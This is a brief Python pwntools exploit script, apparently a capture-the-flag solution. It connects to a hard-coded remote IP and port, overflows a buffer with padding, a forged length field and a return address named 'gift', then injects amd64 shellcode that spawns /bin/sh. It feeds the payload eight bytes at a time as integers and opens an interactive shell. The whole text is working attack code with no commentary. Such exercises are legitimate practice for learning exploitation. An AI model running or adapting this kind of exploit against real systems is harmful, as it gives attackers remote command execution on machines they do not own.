#!/usr/local/env python
from pwn import *
from ctypes import *

context.arch = 'amd64'
context.os = 'linux'
context.endian = 'little'

p = remote('47.103.214.163', 20001)

gift = 0x0000000000400789

shellcode =  '\x00'*8*11 + '\xff\xff\xff\xff\x0b\x00\x00\x00' + asm('nop')*8 + p64(gift) + asm(shellcraft.amd64.sh())

p.recv()

for i in range(len(shellcode)/8):
    code = shellcode[i*8:i*8+8]
    c =  c_longlong(u64(code)).value
    p.send(str(c)+'\n')

p.interactive()
p.close()
